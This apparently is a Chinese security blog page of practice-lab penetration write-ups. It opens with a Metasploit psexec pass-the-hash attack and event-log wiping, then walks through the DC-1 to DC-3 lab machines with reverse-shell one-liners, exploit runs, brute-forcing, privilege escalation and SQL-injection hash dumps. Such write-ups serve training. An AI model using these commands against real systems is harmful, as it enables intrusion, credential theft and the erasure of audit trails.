<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lport <span class="number">443</span></span><br><span class="line">lport =&gt; <span class="number">443</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBPass b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">SMBPass =&gt; b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">443</span> </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Connecting to the server...</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Authenticating to <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> as user <span class="string">''</span>...</span><br></pre></td></tr></table></figure>



<h3 id="2-7-掩踪灭迹"><a href="#2-7-掩踪灭迹" class="headerlink" title="2.7 掩踪灭迹"></a><strong>2.7 掩踪灭迹</strong></h3><p><strong>清除日志痕迹</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping <span class="number">1509</span> records from Application...</span><br><span class="line">[*] Wiping <span class="number">4759</span> records from System...</span><br><span class="line">[*] Wiping <span class="number">1453</span> records from Security...</span><br></pre></td></tr></table></figure>






      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-DC靶场系列" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/08/28/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/"
    >DC靶场系列</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/08/28/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" class="article-date">
  <time datetime="2020-08-28T06:55:26.000Z" itemprop="datePublished">2020-08-28</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>DC-1靶机渗透：</p>
<p>知识要点：</p>
<p>1.反弹shell，如何反弹？反弹原理？有哪几种反弹方式？</p>
<p>2.漏洞利用，CVE-2018-7600 Drupal核心远程代码执行漏洞</p>
<p>3.提权方式，如suid提权</p>
<p>4.drupal配置文件和重置管理员密码</p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h2><p>为什么要反弹shell？</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python: python -c "import pty;pty.spawn('/bin/bash')"</span><br><span class="line">ruby: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br><span class="line">nc: nc -e /bin/bash ip port</span><br><span class="line">php:&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">sock=fsockopen(<span class="string">"ip"</span>,port);//自己的外网ip，端口任意</span></span><br><span class="line">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>





<h2 id="Linux下提权"><a href="#Linux下提权" class="headerlink" title="Linux下提权"></a><strong>Linux下提权</strong></h2><p>SUID：特殊权限</p>
<p>kail下自带密码本路劲</p>
<p>/usr/share/wordlists</p>
<p>解压缩命令 gunzip xx.gz</p>
<p>hydra -l admin -P  /usr/share/wordlists/rockyou.txt  -f 192.168.17.130  http-post-form   ”/login.php:username=^USER^&amp;password=^PASS^:S=logout“ -vV</p>
<p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.17.130  http-post-form “/login.php:username=^USER^ password=^PASS^:S=logout” -F</p>
<p>[22][ssh] host: 192.168.126.149   login: jim   password: jibril04</p>
<p>知识点：wpscan的使用、cewl生成密码</p>
<p>绕过受限shell、git提权</p>
<h2 id="DC-1渗透过程"><a href="#DC-1渗透过程" class="headerlink" title="DC-1渗透过程"></a><strong>DC-1渗透过程</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#发现主机ip</span></span><br><span class="line">nmap -sV -A <span class="number">192.168</span><span class="number">.126</span><span class="number">.141</span> <span class="comment">#详细端口服务扫描</span></span><br><span class="line"><span class="comment">###发现了80端口是drupal7 服务，开启msf查找漏洞</span></span><br><span class="line">msf5 &gt; search drupal</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/gather/drupal_openid_xxe             <span class="number">2012</span><span class="number">-10</span><span class="number">-17</span>       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   <span class="number">4</span>  exploit/unix/webapp/drupal_drupalgeddon2       <span class="number">2018</span><span class="number">-03</span><span class="number">-28</span>       excellent  Yes    Drupal Drupalgeddon <span class="number">2</span> Forms API Property Injection</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts <span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span></span><br><span class="line">rhosts =&gt; 192.168.126.153</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">4444</span> </span><br><span class="line">meterpreter &gt; </span><br><span class="line"><span class="comment">#成功进入目标服务器，为稳定连接，可以反弹shell到本地</span></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span>  <span class="comment">#获取交互shell</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ bash -i &amp;&gt; /dev/tcp/<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="comment">#反弹bash</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333 #本地监听</span></span><br><span class="line">listening on [any] <span class="number">2333</span> ...</span><br><span class="line"><span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>] <span class="number">51022</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span> <span class="comment">#这里再反弹一个更稳定</span></span><br></pre></td></tr></table></figure>

<p><strong>本地发现flag1、提示查看数据库配置文件，发现flag2，给了数据库的账号密码，连接数据库看看</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> mysql <span class="literal">-u</span> dbuser <span class="literal">-p</span>  <span class="comment">#连接数据库</span></span><br><span class="line">Enter password: R0ck3t</span><br><span class="line">mysql&gt; show databases;  </span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; select * from users \G;</span><br><span class="line">select * from users \G;</span><br><span class="line">*************************** <span class="number">2</span>. row ***************************</span><br><span class="line">             uid: <span class="number">1</span></span><br><span class="line">            name: admin</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: <span class="number">1550581826</span></span><br><span class="line">          access: <span class="number">1550583852</span></span><br><span class="line">           login: <span class="number">1550582362</span></span><br><span class="line">          status: <span class="number">1</span></span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: <span class="number">0</span></span><br><span class="line">            init: admin@example.com</span><br><span class="line">            <span class="keyword">data</span>: b:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">###修改数据库admin的密码，这里用自带的hash加密求hash值</span></span><br><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> php scripts/password<span class="literal">-hash</span>.sh <span class="number">123456</span></span><br><span class="line">password: <span class="number">123456</span>                hash: <span class="variable">$S</span><span class="variable">$DvvyyPuAd4L6M</span>/fZV0kmnokciLomH5YSvUZ.w.aaALZpqe1zMTtV</span><br><span class="line"><span class="comment">#更新数据库密码</span></span><br><span class="line">update users set pass=<span class="string">'$S$DRP9A87VYWMUnTb4Dl7yivYAlibCNONO32cCB3Qc1LT5Alr90rAu'</span> where uid=<span class="number">1</span>;</span><br><span class="line"><span class="comment">#登陆网页发现flag3，提示查看/etc/passwd</span></span><br><span class="line"><span class="comment">#提权，寻找有suid权限的文件</span></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / <span class="literal">-perm</span> /<span class="number">4000</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">touch test <span class="comment"># 创建一个空文件</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'whoami'</span> \; <span class="comment">#查看是否提权</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'/bin/sh'</span> \;<span class="comment">#将root的bash反弹</span></span><br><span class="line"><span class="comment">#cd /root 找到最终的flag文件</span></span><br><span class="line">cat final<span class="literal">-flag</span>.txt</span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">'_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it'</span>s all greatly</span><br><span class="line">appreciated.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-2渗透过程"><a href="#DC-2渗透过程" class="headerlink" title="DC-2渗透过程"></a><strong>DC-2渗透过程</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -A -p- dc-2 #全端口扫描更具体</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">10</span> ((Debian))</span><br><span class="line">|_http<span class="literal">-generator</span>: WordPress <span class="number">4.7</span>.<span class="number">10</span></span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Apache/<span class="number">2.4</span>.<span class="number">10</span> (Debian)</span><br><span class="line">|_http<span class="literal">-title</span>: DC<span class="literal">-2</span> &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">|_https<span class="literal">-redirect</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line"><span class="number">7744</span>/tcp open  ssh     OpenSSH <span class="number">6.7</span>p1 Debian <span class="number">5</span>+deb8u7 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">1024</span> <span class="number">52</span>:<span class="number">51</span>:<span class="number">7</span>b:<span class="number">6</span>e:<span class="number">70</span>:a4:<span class="number">33</span>:<span class="number">7</span>a:d2:<span class="number">4</span>b:e1:<span class="number">0</span>b:<span class="number">5</span>a:<span class="number">0</span>f:<span class="number">9</span>e:d7 (DSA)</span><br><span class="line">|   <span class="number">2048</span> <span class="number">59</span>:<span class="number">11</span>:d8:af:<span class="number">38</span>:<span class="number">51</span>:<span class="number">8</span>f:<span class="number">41</span>:a7:<span class="number">44</span>:b3:<span class="number">28</span>:<span class="number">03</span>:<span class="number">80</span>:<span class="number">99</span>:<span class="number">42</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> df:<span class="number">18</span>:<span class="number">1</span>d:<span class="number">74</span>:<span class="number">26</span>:ce:c1:<span class="number">4</span>f:<span class="number">6</span>f:<span class="number">2</span>f:c1:<span class="number">26</span>:<span class="number">54</span>:<span class="number">31</span>:<span class="number">51</span>:<span class="number">91</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> d9:<span class="number">38</span>:<span class="number">5</span>f:<span class="number">99</span>:<span class="number">7</span>c:<span class="number">0</span>d:<span class="number">64</span>:<span class="number">7</span>e:<span class="number">1</span>d:<span class="number">46</span>:f6:e9:<span class="number">7</span>c:c6:<span class="number">37</span>:<span class="number">17</span> (ED25519)</span><br><span class="line"></span><br><span class="line"><span class="comment">#访问80端口，发现重定向到http://dc-2</span></span><br><span class="line">root@kali:~<span class="comment"># vi /etc/hosts #写入ip dc-2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#访问发现是wordpress，用wpscan扫描</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -e u</span></span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="type">i</span>] <span class="title">User</span></span>(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2</span></span><br><span class="line">CeWL <span class="number">5.4</span>.<span class="number">7</span> (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -U users.txt -P passwd.txt </span></span><br><span class="line"></span><br><span class="line">[<span class="type">i</span>] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># ssh tom@192.168.126.153 -p 7744</span></span><br></pre></td></tr></table></figure>



<p>连接到tom主机上后发现大部分命令无法使用，查看环境变量发现没用/bin/bash，需要添加环境变量才可以正常执行bash，查看可执行的命令（这里有个查询的小技巧，免去一个个尝试），发现可正常执行vi，在vi中可执行命令，可利用此添加环境变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">tom@DC<span class="number">-2</span>:~$ export  <span class="comment">#查看环境变量</span></span><br><span class="line">declare -x HOME=<span class="string">"/home/tom"</span></span><br><span class="line">declare -x LANG=<span class="string">"en_US.UTF-8"</span></span><br><span class="line">declare -x LOGNAME=<span class="string">"tom"</span></span><br><span class="line">declare -x MAIL=<span class="string">"/var/mail/tom"</span></span><br><span class="line">declare -x OLDPWD</span><br><span class="line">declare -rx PATH=<span class="string">"/home/tom/usr/bin"</span></span><br><span class="line">declare -x PWD=<span class="string">"/home/tom"</span></span><br><span class="line">declare -rx SHELL=<span class="string">"/bin/rbash"</span></span><br><span class="line">declare -x SHLVL=<span class="string">"1"</span></span><br><span class="line">declare -x SSH_CLIENT=<span class="string">"192.168.126.33 35824 7744"</span></span><br><span class="line">declare -x SSH_CONNECTION=<span class="string">"192.168.126.33 35824 192.168.126.154 7744"</span></span><br><span class="line">declare -x SSH_TTY=<span class="string">"/dev/pts/1"</span></span><br><span class="line">declare -x TERM=<span class="string">"xterm-256color"</span></span><br><span class="line">declare -x USER=<span class="string">"tom"</span></span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo $PATH</span><br><span class="line">/home/tom/usr/bin</span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo /home/tom/usr/bin/*  <span class="comment">#查询可执行命令</span></span><br><span class="line">/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/vi</span><br><span class="line"></span><br><span class="line">vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">$ export PATH=$PATH:/bin/ <span class="comment"># 导入环境变量</span></span><br><span class="line">$ export PATH=$PATH:/usr/bin</span><br><span class="line"></span><br><span class="line">jerry@DC<span class="number">-2</span>:/home/tom$ sudo -l  <span class="comment">#查看可执行root权限的命令</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC<span class="number">-2</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC<span class="number">-2</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里提示可利用git提权</span></span><br><span class="line">root@DC<span class="number">-2</span>:/home/jerry<span class="comment"># cat flag4.txt </span></span><br><span class="line">Good to see that yo<span class="string">u've made it this far - but you'</span>re <span class="keyword">not</span> home yet. </span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line">No hints here - yo<span class="string">u're on your own now.  :-)</span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jerry@DC-2:/home/tom$ sudo git help config</span></span><br><span class="line"><span class="string">！/bin/sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@DC-2:~# cat final-flag.txt </span></span><br><span class="line"><span class="string"> __    __     _ _       _                    _ </span></span><br><span class="line"><span class="string">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ | |  / _` |/ _ \| '</span>_ \ / _ \/  /</span><br><span class="line"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span><br><span class="line">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-3渗透过程"><a href="#DC-3渗透过程" class="headerlink" title="DC-3渗透过程"></a><strong>DC-3渗透过程</strong></h2><p><strong>就开放了80端口，可用wappalyzer插件查看cms指纹等信息，发现是joomla框架</strong></p>
<p><img src="/2020/08/28/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/1.png" alt></p>
<p><strong>利用joomscan扫描出后台登陆地址、版本信息以及相关目录，然后查询相关漏洞信息进行利用！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># perl joomscan.pl -u http://192.168.126.150</span></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla <span class="number">3.7</span>.<span class="number">0</span></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/components</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/modules</span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/</span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># searchsploit joomla 3.7.0</span></span><br><span class="line">Joomla! <span class="number">3.7</span>.<span class="number">0</span> - <span class="string">'com_fields'</span> SQL Injection                                                           | exploits/php/webapps/<span class="number">42033</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看漏洞利用方式，存在SQL注入漏洞，相关sqlmap使用方式也列出来了</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span></span><br><span class="line"><span class="comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="comment"># Date: 05-19-2017</span></span><br><span class="line"><span class="comment"># CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[<span class="type">fullordering</span>]=updatexml%<span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Using</span> Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap <span class="literal">-u</span> <span class="string">"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> -<span class="literal">-risk</span>=<span class="number">3</span> -<span class="literal">-level</span>=<span class="number">5</span> -<span class="literal">-random</span><span class="literal">-agent</span> -<span class="literal">-dbs</span> <span class="literal">-p</span> list[<span class="type">fullordering</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sqlmap爆破出管理员账号和密码</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -t</span></span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -T "#__users" -C username,password --dump</span></span><br><span class="line"></span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | <span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><strong>得到的密码是hash值，可以利用hashcat进行爆破，密码本用kail自带的rockyou.txt</strong></p>
